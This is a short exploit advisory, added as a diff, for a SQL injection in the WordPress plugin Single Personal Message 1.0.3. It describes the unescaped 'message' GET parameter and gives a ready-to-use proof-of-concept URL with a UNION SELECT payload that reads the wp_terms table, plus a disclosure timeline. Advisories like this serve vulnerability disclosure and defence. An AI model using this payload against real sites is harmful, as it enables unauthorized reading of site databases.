@@ -1,0 +1,29 @@
+# Exploit Title: Single Personal Message 1.0.3 – Plugin WordPress – Sql Injection
+# Date: 28/11/2016
+# Exploit Author: Lenon Leite
+# Vendor Homepage: https://wordpress.org/plugins/simple-personal-message/
+# Software Link: https://wordpress.org/plugins/simple-personal-message/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version: 1.0.3
+# Tested on: Windows 8
+
+1 - Description:
+
+$_GET['message'] is not escaped. Is accessible for every registered user.
+
+http://lenonleite.com.br/en/blog/2016/12/05/single-personal-message-1-0-3-plugin-wordpress-sql-injection/
+
+2 - Proof of Concept:
+
+1 - Login as regular user (created using wp-login.php?action=register):
+
+2 - Access url:
+
+http://target/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,name,5,slug,7,8,9,10,11,12%20FROM%20wp_terms%20WHERE%20term_id=1
+
+3 - Timeline:
+
+28/11/2016 - Discovered
+28/11/2016 - vendor notified
